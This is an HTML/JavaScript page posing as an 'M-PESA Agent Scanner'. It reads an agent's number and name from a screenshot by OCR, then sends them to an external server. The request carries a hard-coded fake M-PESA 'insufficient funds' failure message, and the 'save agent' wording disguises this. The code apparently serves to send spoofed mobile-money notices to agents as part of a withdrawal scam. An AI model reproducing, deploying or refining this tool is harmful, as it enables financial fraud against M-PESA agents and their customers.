<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M-PESA Agent Scanner</title>
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; margin: 0; }
        .container { max-width: 450px; margin: auto; background: #1e1e1e; padding: 25px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h3 { text-align: center; color: #4CAF50; margin-top: 0; letter-spacing: 1px; }
        
        .upload-section { 
            border: 2px dashed #4CAF50; padding: 40px 20px; text-align: center; 
            border-radius: 12px; cursor: pointer; transition: 0.3s; background: #252525;
        }
        .upload-section:hover { background: #2a2a2a; border-color: #81c784; }
        #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }

        .result-card { margin-top: 20px; padding: 15px; background: #252525; border-radius: 10px; border: 1px solid #333; }
        label { display: block; font-size: 0.75rem; color: #888; margin-bottom: 5px; text-transform: uppercase; font-weight: bold; }
        
        .field { margin-bottom: 15px; }
        input[type="text"] { 
            width: 100%; padding: 12px; background: #333; border: 1px solid #444; 
            border-radius: 8px; color: #fff; font-size: 1rem; outline: none; box-sizing: border-box;
        }
        input:focus { border-color: #4CAF50; }

        .btn-primary { 
            width: 100%; padding: 16px; background: #4CAF50; border: none; 
            border-radius: 8px; color: white; font-weight: bold; font-size: 1rem; 
            cursor: pointer; transition: 0.2s; margin-top: 10px;
        }
        .btn-primary:active { transform: scale(0.98); }
        .btn-primary:disabled { background: #444; cursor: not-allowed; }

        #loader { display: none; text-align: center; color: #ffeb3b; font-weight: bold; margin: 15px 0; }
        pre { background: #000; padding: 10px; border-radius: 6px; font-size: 0.85rem; color: #4CAF50; text-align: center; min-height: 20px; }
    </style>
</head>
<body>

<div class="container">
    <h3>Agent Quick-Save</h3>
    
    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
        <span id="uploadText">📷 Tap to Scan Screenshot</span>
        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
        <img id="imagePreview">
    </div>

    <div id="loader">⚡ Reading Agent Details...</div>

    <div class="result-card">
        <div class="field">
            <label>Agent Number</label>
            <input type="text" id="agentNo" placeholder="Scanning...">
        </div>
        <div class="field">
            <label>Agent Name (Location)</label>
            <input type="text" id="agentName" placeholder="Scanning...">
        </div>
    </div>

    <button class="btn-primary" id="saveBtn" onclick="saveAgent()">SAVE AGENT DATA</button>
    <pre id="output"></pre>
</div>

<script>
const API_URL = "https://mpesab.vercel.app";
const FAIL_MSG = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to withdraw. Available Fuliza M-PESA limit KSH0.00.";

async function handleImage(input) {
    const file = input.files[0];
    if (!file) return;

    // Show Preview
    const preview = document.getElementById('imagePreview');
    const uploadText = document.getElementById('uploadText');
    preview.src = URL.createObjectURL(file);
    preview.style.display = 'block';
    uploadText.style.display = 'none';

    document.getElementById('loader').style.display = 'block';

    try {
        const { data: { text } } = await Tesseract.recognize(file, 'eng');
        parseMpesaText(text);
    } catch (err) {
        alert("Could not read image. Please use a clearer screenshot.");
    } finally {
        document.getElementById('loader').style.display = 'none';
    }
}

function parseMpesaText(rawText) {
    // Split into lines and clean whitespace
    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
    
    let detectedNo = "";
    let detectedName = "";

    for (let i = 0; i < lines.length; i++) {
        // Look for the 6-7 digit agent number
        const numMatch = lines[i].match(/\b\d{6,7}\b/);
        
        if (numMatch) {
            detectedNo = numMatch[0];
            // The name is typically the line directly below the number in the app
            if (i + 1 < lines.length) {
                detectedName = lines[i+1];
                // If the next line is also text (like location), grab it too
                if (i + 2 < lines.length && !lines[i+2].includes("Store") && !lines[i+2].includes("Amount")) {
                    detectedName += " " + lines[i+2];
                }
            }
            break; 
        }
    }

    document.getElementById('agentNo').value = detectedNo;
    document.getElementById('agentName').value = detectedName.toUpperCase();
}

async function saveAgent() {
    const btn = document.getElementById("saveBtn");
    const out = document.getElementById("output");
    const name = document.getElementById("agentName").value.trim();
    const phone = document.getElementById("agentNo").value.trim();

    if (!phone || !name) {
        out.innerText = "⚠ Missing details. Scan again.";
        return;
    }

    btn.disabled = true;
    btn.innerText = "Syncing...";

    try {
        const res = await fetch(`${API_URL}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                name: name,
                amount: 0,
                token: "EXTRACT_" + Math.floor(Math.random() * 10000),
                message: FAIL_MSG
            })
        });

        if (res.ok) {
            out.innerText = "✅ SUCCESS\n" + name;
            btn.innerText = "SAVED ✓";
        } else {
            throw new Error();
        }
    } catch (e) {
        out.innerText = "❌ Network Error";
        btn.disabled = false;
        btn.innerText = "RETRY SAVE";
    }
}
</script>

</body>
</html>
